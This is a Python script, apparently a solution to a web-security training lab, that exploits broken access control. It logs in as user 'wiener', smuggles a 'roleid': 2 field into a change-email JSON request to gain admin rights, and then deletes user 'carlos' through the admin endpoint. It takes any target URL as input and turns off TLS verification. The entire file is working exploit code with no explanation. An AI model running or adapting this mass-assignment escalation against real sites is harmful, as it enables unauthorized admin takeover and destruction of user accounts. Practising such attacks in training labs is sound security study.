import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def delete_user(s, url):

    # login as the user 'wiener'
    login_url = url + "/login"
    data_login = {
        "username": "wiener",
        "password": "peter"
    }
    r = s.post(login_url, data=data_login, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) Login successful.")

        # change the role id of the user
        change_email_url = url + "/my-account/change-email"
        data_role_change = {
            "email": "test@test.com", "roleid" : 2
        }
        r = s.post(change_email_url, json=data_role_change, proxies=proxies, verify=False)
        res = r.text
        if "Admin" in res:
            print("(+) Role changed successfully.")

            # Delete user 'carlos'
            delete_carlos_user_url = url + "/admin/delete?username=carlos"
            r = s.get(delete_carlos_user_url, proxies=proxies, verify=False)

            if r.status_code == 200:
                print("(+) User 'carlos' deleted successfully.")

            else:
                print("(-) Failed to delete user 'carlos'. Status code: %d" % r.status_code)
                print("(-) Exiting the script.")
                sys.exit(-1)
        else:
            print("(-) Failed to change the role. Exiting the script.")
            sys.exit(-1)
    else:
        print("(-) Login failed. Exiting the script.")
        sys.exit(-1)

        

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)

if __name__ == "__main__":
    main()